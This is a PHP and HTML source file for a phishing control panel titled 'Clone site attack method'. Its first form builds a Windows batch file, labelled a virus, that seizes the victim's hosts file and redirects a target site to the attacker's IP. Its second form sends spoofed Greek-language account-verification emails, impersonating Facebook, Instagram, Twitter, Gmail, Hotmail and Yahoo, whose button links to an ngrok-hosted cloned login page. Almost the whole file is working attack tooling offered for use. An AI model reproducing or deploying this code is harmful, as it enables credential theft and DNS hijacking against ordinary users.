<html>
<head>

    <title> clonenew </title>
  
  <link rel="icon" type="image/jpg" href="/css/clone_title.jpg" />

 <link rel="stylesheet" type="text/css" href="css/dns.css">



<style>

input[type='radio'] 
{ 
transform: scale(2); 
}

</style>


</head>




<body id="body">


    <div class="shell-wrap">
  <p class="shell-top-bar"> Clone site attack method </p>
  

      <div align="center">

     <h3> 1) Create virus </h3> 

    <form action="" method="post">

   <select name="fake_dns" id="select_dns" required>
     <option selected disabled> Operating System of victim </option>
      <optgroup label="Microsoft windows">
    <option value ="windows xp">   Windows XP  </option>
    <option value ="windows 7">    Windows 7  </option>
    <option value ="windows 8">    Windows 8  </option>
    <option value ="windows 8.1">  Windows 8.1  </option>
    <option value ="windows 10">   Windows 10  </option>
      </optgroup>
  </select>
    
       <br><br>


      <input type="radio" name="network" value="Lan" checked required> Lan
         &nbsp; &nbsp; &nbsp; 
      <input type="radio" name="network" value="Wan"> Wan


     <br><br>

   <input type="submit" name="submit_dns" value="Fake dns generator" id="submit">

  </form>
    </div>

  
        <hr>
        <br>
 
     <div align="center">

            <h3> 2) Send to email </h3> 

         <form action="" method="post">

          <!--
         <input type="radio" name="email_net" value="Lan" checked required> Lan
         &nbsp; &nbsp; &nbsp; 
      <input type="radio" name="email_net" value="Wan"> Wan
         --> 


  <font color="black">  < </font>
     <input type="email" name="email" id="email" maxlength="64" placeholder="Email to victim"  required> 
      <font color="black"> > </font>
 
      <font color="black">  < </font>
     <input type="text" name="ngrok" id="ngrok" maxlength="64" placeholder="Ngrok link"  required> 
      <font color="black"> > </font>

             <br><br> 

    <input type="submit" name="submit_email_phishing" value="Email Phishing" id="submit">
         </form>
      </div>
       
        <hr> 

         <br>

      <div align="center">
        <h3> 3) Normal attack </h3> 
               <?php
              
                 $url_redirection = shell_exec('shell/./my_ipv4.sh');
            //echo "<meta http-equiv='refresh' content= '2;URL=http://$url_redirection?login'/>";
 
            echo "<form action='http://$url_redirection' method='post'>
                   <input type='submit' name='normal' value='Normal attack' id='submit'>
                  </form>"; 
              ?>
      </div>

  <!--
  <div id="footer">
   <img src="/css/clone_diagram.jpg" height="300" width="500">
   </div>
    -->


 


</body>
</html>




<?php



 clearstatcache();

  session_start();


  require_once('__SRC__/class_tools.php');

  if (class_exists('INPUT_DATA_AVAILABLE')) 
      {
        $obj_dns = new INPUT_DATA_AVAILABLE;
      

   if (isset($_POST['submit_dns']))
       {

      $fake_dns   =  $obj_dns-> SAFE_DATA_ENTER($_POST['fake_dns']);
      $network    =  $obj_dns-> SAFE_DATA_ENTER($_POST['network']);
 
       if($fake_dns == true)
         {
 

         // Get path from operating system 



        if($fake_dns == "windows xp")
           {
            $operating_system_path =  "C:\WINDOWS\System32\drivers";
             }


        else if($fake_dns == "windows 7")
             {
              $operating_system_path =  "C:\Windows\System32\drivers";
              }


       else if($fake_dns == "windows 8")
             {
              $operating_system_path =  "C:\Windows\System32\Drivers";
              }


        else if($fake_dns == "windows 8.1")
             {
              $operating_system_path =  "C:\Windows\System32\Drivers";
              }

  

        else if($fake_dns == "windows 10")
             {
              $operating_system_path =  "C:\Windows\System32\drivers";
              }
 



              if (isset($_SESSION['site_hack']))             
                {

            $ipv4 = trim(shell_exec('shell/./my_ipv4.sh'));

            $PublicIP = trim(shell_exec("shell/./my_public_ip.sh")); 




              // Get network type for attack

              if ($network == "Lan")
               {
                $MyIP = $ipv4;
                 }


             else  if ($network == "Wan")
                 {
                  $MyIP = $PublicIP;
                   }




            $dns = '"' .$_SESSION['site_hack'] .'"';


            $dns_0 = str_replace ("https","http",$dns);

            $dns_1 = str_replace ("https://","",$dns);
 
            $dns_2 = str_replace ("https://www.","",$dns);
 
            $dns_3 = str_replace ("com","gr",$dns_1);

            $dns_4 = str_replace ("com","gr",$dns_2);


            $dns_5 = str_replace ("https","http",$dns);
 
            $dns_6 = str_replace ("https://www.","http://",$dns);
 
            $dns_7 = str_replace ("com","gr",$dns_5);

            $dns_8 = str_replace ("com","gr",$dns_6);



            $hosts = fopen("export/l_win.bat", "w") or die("Unable to open file!");
            $lines_hosts = '@echo off' 
                    .PHP_EOL .'Takeown /f' ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant Administrator:F'
                    .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant Administrators:F'
                    .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant SYSTEM:F'
                    .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant "Authenticated Users":F'
                    .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant "domain\users":R'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns,  '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_0, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts' 
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_1, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_2, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_3, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_4, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_5, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_6, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_7, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_8, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                    .PHP_EOL .'exit'; 



            fwrite($hosts, $lines_hosts);
            fclose($hosts);

           chmod("/var/www/clonenew/export/l_win.bat", 0777);


              } // end of isset session site hack






          if (isset($_SESSION['site_ready']))
              {


            $ipv4 = trim(shell_exec('shell/./my_ipv4.sh'));

            $publicIP = trim(shell_exec("shell/./my_public_ip.sh")); 




              // Get network type for attack

              if ($network == "Lan")
               {
                $MyIP = $ipv4;
                 }


             else  if ($network == "Wan")
                 {
                  $MyIP = $publicIP;
                   }

 

            $dns_ready = '"' .$_SESSION['site_ready'] .'"';

            $dns_ready_0 = str_replace ("https","http",$dns_ready);

            $dns_ready_1 = str_replace ("https://","",$dns_ready);
 
            $dns_ready_2 = str_replace ("https://www.","",$dns_ready);
 
            $dns_ready_3 = str_replace ("com","gr",$dns_ready_1);

            $dns_ready_4 = str_replace ("com","gr",$dns_ready_2);


            $dns_ready_5 = str_replace ("https","http",$dns_ready);
 
            $dns_ready_6 = str_replace ("https://www.","http://",$dns_ready);
 
            $dns_ready_7 = str_replace ("com","gr",$dns_ready_5);

            $dns_ready_8 = str_replace ("com","gr",$dns_ready_6);



         $hosts_ready = fopen("export/l_win.bat", "w") or die("Unable to open file!");
         $lines_hosts_ready = '@echo off' 
             .PHP_EOL .'Takeown /f' ." "  ."$operating_system_path"
             .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant Administrator:F'
             .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant Administrators:F'
             .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant SYSTEM:F'
             .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .'/grant "Authenticated Users":F'
             .PHP_EOL .'icacls'     ." "  ."$operating_system_path"  .'\etc\hosts'  .' /grant "domain\users":R'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready, '"')     ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_0, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_1, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_2, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_3, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_4, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_5, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_6, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_7, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL ."echo $MyIP"  ." "   .trim($dns_ready_8, '"')   ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
             .PHP_EOL .'exit';
         fwrite($hosts_ready, $lines_hosts_ready);
         fclose($hosts_ready);



        chmod("/var/www/clonenew/export/l_win.bat", 0777);
            
             } // end of isset session site_ready




  //echo "<script type='text/javascript'>alert('Fake dns for $fake_dns generated');
       //  </script>";
          echo ("<script>location.href='/'</script>");
         } 
 

       } // end of submit dns








 
     // for sumbit email phishing

     if (isset($_POST['submit_email_phishing']))
         {
 
       // $email_net =  $obj_dns-> SAFE_DATA_ENTER($_POST['email_net']);
        $email     =  $obj_dns-> SAFE_DATA_ENTER($_POST['email']);
        $ngrok     =  $obj_dns-> SAFE_DATA_ENTER($_POST['ngrok']);


        //$ipv4_mail = trim(shell_exec('shell/./my_ipv4.sh'));

       // $PublicIP_mail = trim(shell_exec("shell/./my_public_ip.sh")); 




              // Get network type for attack

              //if ($email_net == "Lan")
              // {
               // $MyIP_mail = $ipv4_mail;
               //  }


            // else  if ($email_net == "Wan")
               //  {
               //   $MyIP_mail = $PublicIP_mail;
                //   }



               // Get clone site name from send link to email 
        
             if (isset($_SESSION['site_hack']))             
                {
                  $str_link =  $_SESSION['site_hack'];
                  $str_link2 = str_replace("https://www.","",$str_link);
                  $str_link3 = str_replace(".com","",$str_link2);
                  $str_link4 = ucfirst($str_link3);
                  $link =   "no-reply" ."@" .$str_link3 .".com";
                  }


            if (isset($_SESSION['site_ready']))           
                {
                  $str_link  = $_SESSION['site_ready'];
                  $str_link2 = str_replace("https://www.","",$str_link);
                  $str_link3 = str_replace(".com","",$str_link2);
                  $str_link4 = ucfirst($str_link3);
                  $link =   "no-reply" ."@" .$str_link3 .".com";
                   }




 if ($link == 'no-reply@facebook_pc.com')
        {

          $link = str_replace(".com_pc","",$str_link2);
          $link =   "no-reply" ."@" .$link .".com";


      require "/var/www/clonenew/mail/PHPMailerAutoload.php";



$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->IsSMTP(); // enable SMTP

$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only

$mail->SMTPAuth = true; // authentication enabled

$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail

$mail->Host = "smtp.gmail.com";

$mail->Port = 465; // or 587

$mail->IsHTML(true);

$mail->Username = "";

$mail->Password = "";

$mail->SetFrom($link, $link);

$mail->FromName = $link;


$mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');

$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Facebook";

$mail->Body = "<h2> <img src='cid:fb' height='24' width='24'> 
                <font color='#45569C'>
                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Facebook  
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#45569C; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Επιβεβαιώστε το λογαριασμό σας 
                </a>";
             

$mail->AddAddress("$email");


     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }


     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }


      } // end if site ready facebook pc
 






else if ($link == 'no-reply@facebook_tablet_mobile.com')
        {

          $link = str_replace(".com_tablet_mobile","",$str_link2);
          $link =   "no-reply" ."@" .$link .".com";


      require "/var/www/clonenew/mail/PHPMailerAutoload.php";



$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->IsSMTP(); // enable SMTP

$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only

$mail->SMTPAuth = true; // authentication enabled

$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail

$mail->Host = "smtp.gmail.com";

$mail->Port = 465; // or 587

$mail->IsHTML(true);

$mail->Username = "";

$mail->Password = "";

$mail->SetFrom($link, $link);

$mail->FromName = $link;


$mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');

$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Facebook";

$mail->Body = "<h2> <img src='cid:fb' height='24' width='24'> 
                <font color='#45569C'>
                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Facebook  
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#45569C; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Επιβεβαιώστε το λογαριασμό σας 
                </a>";
             

$mail->AddAddress("$email");


     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }


     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }


      } // end if site ready facebook tablet and mobile








 else if ($link == 'no-reply@instagram.com')
        {

      require "/var/www/clonenew/mail/PHPMailerAutoload.php";



$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->IsSMTP(); // enable SMTP

$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only

$mail->SMTPAuth = true; // authentication enabled

$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail

$mail->Host = "smtp.gmail.com";

$mail->Port = 465; // or 587

$mail->IsHTML(true);

$mail->Username = "";

$mail->Password = "";

$mail->SetFrom($link, $link);

$mail->FromName = $link;


$mail->AddEmbeddedImage('css/mail_pics/inst.png', 'inst');

$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Instagram";

$mail->Body = "<h2> <img src='cid:inst' height='24' width='24'> 
                <font color='#EB9E6B'>
                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Instagram  
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#EB9E6B; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Επιβεβαιώστε το λογαριασμό σας 
                </a>";
             

$mail->AddAddress("$email");


     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }


     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }


      } // end if site ready instagram







else if ($link == 'no-reply@twitter.com')
        {

      require "/var/www/clonenew/mail/PHPMailerAutoload.php";



$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->IsSMTP(); // enable SMTP

$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only

$mail->SMTPAuth = true; // authentication enabled

$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail

$mail->Host = "smtp.gmail.com";

$mail->Port = 465; // or 587

$mail->IsHTML(true);

$mail->Username = "";

$mail->Password = "";

$mail->SetFrom($link, $link);

$mail->FromName = $link;


$mail->AddEmbeddedImage('css/mail_pics/twitt.png', 'twitt');

$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Twitter";

$mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
                <font color='#65A8EC'>
                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Twitter  
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#65A8EC; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Επιβεβαιώστε το λογαριασμό σας 
                </a>";
             

$mail->AddAddress("$email");


     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }


     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }


      } // end if site ready twitter







else if ($link == 'no-reply@gmail.com')
        {

      require "/var/www/clonenew/mail/PHPMailerAutoload.php";



$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->IsSMTP(); // enable SMTP

$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only

$mail->SMTPAuth = true; // authentication enabled

$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail

$mail->Host = "smtp.gmail.com";

$mail->Port = 465; // or 587

$mail->IsHTML(true);

$mail->Username = "";

$mail->Password = "";

$mail->SetFrom($link, $link);

$mail->FromName = $link;


$mail->AddEmbeddedImage('css/mail_pics/gm.png', 'gm');

$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Gmail";

$mail->Body = "<h2> <img src='cid:gm' height='24' width='24'> 
                <font color='#CA3737'>
                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Gmail  
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#CA3737; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Επιβεβαιώστε το λογαριασμό σας 
                </a>";
             

$mail->AddAddress("$email");


     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }


     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }


      } // end if site ready gmail










else if ($link == 'no-reply@https://login.live.com')
        {

          $str_link2 = str_replace("https://","",$str_link);
          $str_link3 = str_replace(".com","",$str_link2);
          $link =   "no-reply" ."@" .$str_link3 .".com";


      require "/var/www/clonenew/mail/PHPMailerAutoload.php";



$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->IsSMTP(); // enable SMTP

$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only

$mail->SMTPAuth = true; // authentication enabled

$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail

$mail->Host = "smtp.gmail.com";

$mail->Port = 465; // or 587

$mail->IsHTML(true);

$mail->Username = "";

$mail->Password = "";

$mail->SetFrom($link, $link);

$mail->FromName = $link;


$mail->AddEmbeddedImage('css/mail_pics/hotm.png', 'hotm');

$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Hotmail";

$mail->Body = "<h2> <img src='cid:hotm' height='24' width='24'> 
                <font color='#006BC1'>
                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Hotmail  
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#006BC1; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Επιβεβαιώστε το λογαριασμό σας 
                </a>";
             

$mail->AddAddress("$email");


     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }


     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }


      } // end if site ready hotmail







else if ($link == 'no-reply@yahoo.com')
        {

      require "/var/www/clonenew/mail/PHPMailerAutoload.php";



$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->IsSMTP(); // enable SMTP

$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only

$mail->SMTPAuth = true; // authentication enabled

$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail

$mail->Host = "smtp.gmail.com";

$mail->Port = 465; // or 587

$mail->IsHTML(true);

$mail->Username = "m";

$mail->Password = "";

$mail->SetFrom($link, $link);

$mail->FromName = $link;


$mail->AddEmbeddedImage('css/mail_pics/yah.png', 'yah');

$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Yahoo";

$mail->Body = "<h2> <img src='cid:yah' height='24' width='24'> 
                <font color='#720E9E'>
                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Yahoo 
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#720E9E; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Επιβεβαιώστε το λογαριασμό σας 
                </a>";
             

$mail->AddAddress("$email");


     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }


     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }


      } // end if site ready yahoo






else 
  {

   require "/var/www/clonenew/mail/PHPMailerAutoload.php";



$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->IsSMTP(); // enable SMTP

$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only

$mail->SMTPAuth = true; // authentication enabled

$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail

$mail->Host = "smtp.gmail.com";

$mail->Port = 465; // or 587

$mail->IsHTML(true);

$mail->Username = "";

$mail->Password = "";

$mail->SetFrom($link, $link);

$mail->FromName = $link;


$mail->AddEmbeddedImage('css/mail_pics/any.png', 'any');

$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας";

$mail->Body = "<h2> <img src='cid:any' height='24' width='24'> 
                <font color='black'>
                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας 
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:grey; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Επιβεβαιώστε το λογαριασμό σας 
                </a>";
             

$mail->AddAddress("$email");


     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }


     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }


      } // end if site anything




    } // end isset of email phishing 



   } // end if isset of class



?>
